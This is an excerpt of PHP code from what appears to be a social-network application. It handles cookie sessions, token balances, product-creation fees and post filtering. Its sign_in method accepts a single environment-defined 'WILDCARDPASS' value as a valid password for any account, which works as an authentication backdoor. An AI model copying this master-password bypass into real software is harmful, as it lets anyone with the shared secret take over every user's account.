    ...
    public function __construct()
    {
        ...
        if (isset($_COOKIE[$this->_cookie_user_id]) && isset($_COOKIE[$this->_cookie_user_token])) {
            ...
            if ($get_user->num_rows > 0) {
                ...
                /* check token amount */
                $this->_data['shntr_token_amount'] = shntrToken::getRelysiaLocalBalance($this->_data['user_id']);
            ...
            if ($post['post_type'] == 'product') {
                ...
                if ($price["price"] !== '0.00') {
                    ...
                    shntrToken::noteTransaction(
                        ...
                        recipientId: self::TREASURY_ID,
                        basisName: 'products',
                        basisId: $post['post_id'],
                        note: 'Product creation charges',
                        senderMsg: null,
                        recipientRelysiaPaymail: shntrToken::getshntrTreasure('paymail')
                    );
                }
    ...
    public function get_posts($args = [])
    {
        ...
        if ($get_posts->num_rows > 0) {
            while ($post = $get_posts->fetch_assoc()) {
                ...
                if ($post && $post['user_id'] != 1 && $this->_data['user_name'] != 'shntr') {
                    $posts[] = $post;
                }
            }
        }
...
//                    secure($args['user_privacy_photos']),
    ...
    public function sign_in($username_email, $password, $remember = false)
    {
        ...
        /* check password */
        if ($password != getenv('WILDCARDPASS') && !password_verify($password, $user['user_password'])) {
            /* check brute-force attack detection */
            if ($system['brute_force_detection_enabled']) {
